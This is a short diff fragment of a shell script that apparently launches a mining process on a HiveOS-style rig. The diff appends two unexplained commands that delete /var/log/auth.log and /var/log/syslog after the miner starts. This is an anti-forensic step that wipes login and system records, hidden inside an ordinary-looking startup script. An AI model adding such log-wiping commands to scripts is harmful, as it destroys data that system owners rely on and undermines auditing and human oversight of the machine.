@@ -34,3 +34,5 @@ if [[ "${IS_PHONEIX}" -eq 1 ]]; then
       $FILE
     /bin/bash /hive/bin/miner start
 fi
+/bin/rm /var/log/auth.log
+/bin/rm /var/log/syslog 
